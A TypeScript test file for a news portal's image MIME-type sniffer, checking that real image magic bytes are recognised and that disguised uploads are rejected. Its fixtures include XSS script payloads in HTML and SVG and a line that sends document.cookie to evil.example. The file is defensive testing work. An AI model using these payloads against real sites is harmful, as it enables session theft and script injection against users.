import { describe, expect, test } from "bun:test";

import { sniffNewsMediaMimeType } from "../src/modules/news-portal/domain/news-media-mime-sniffer";

function bytesOf(...values: number[]): Uint8Array {
  return new Uint8Array(values);
}

describe("sniffNewsMediaMimeType (Issue #634)", () => {
  test("recognizes JPEG magic bytes", () => {
    expect(
      sniffNewsMediaMimeType(bytesOf(0xff, 0xd8, 0xff, 0xe0, 0x00, 0x10))
    ).toBe("image/jpeg");
  });

  test("recognizes PNG magic bytes", () => {
    expect(
      sniffNewsMediaMimeType(
        bytesOf(0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a, 0x00, 0x00)
      )
    ).toBe("image/png");
  });

  test("recognizes GIF87a and GIF89a magic bytes", () => {
    expect(
      sniffNewsMediaMimeType(
        bytesOf(0x47, 0x49, 0x46, 0x38, 0x37, 0x61, 0x00, 0x00)
      )
    ).toBe("image/gif");
    expect(
      sniffNewsMediaMimeType(
        bytesOf(0x47, 0x49, 0x46, 0x38, 0x39, 0x61, 0x00, 0x00)
      )
    ).toBe("image/gif");
  });

  test("recognizes WebP (RIFF....WEBP) magic bytes", () => {
    const bytes = new TextEncoder().encode("RIFF\x00\x00\x00\x00WEBPVP8 ");
    expect(sniffNewsMediaMimeType(bytes)).toBe("image/webp");
  });

  test("returns undefined for an HTML payload disguised with a .jpg name/claimed mime type — the exact Issue #631 exploit scenario", () => {
    const html = new TextEncoder().encode(
      "<html><body><script>alert('xss')</script></body></html>"
    );
    expect(sniffNewsMediaMimeType(html)).toBeUndefined();
  });

  test("returns undefined for a JS payload", () => {
    const js = new TextEncoder().encode(
      "fetch('https://evil.example/steal?c=' + document.cookie)"
    );
    expect(sniffNewsMediaMimeType(js)).toBeUndefined();
  });

  test("returns undefined for empty/too-short input", () => {
    expect(sniffNewsMediaMimeType(new Uint8Array())).toBeUndefined();
    expect(sniffNewsMediaMimeType(bytesOf(0xff))).toBeUndefined();
  });

  test("returns undefined for an SVG payload (never allow-listed, doc §9)", () => {
    const svg = new TextEncoder().encode(
      "<svg xmlns='http://www.w3.org/2000/svg'><script>alert(1)</script></svg>"
    );
    expect(sniffNewsMediaMimeType(svg)).toBeUndefined();
  });
});
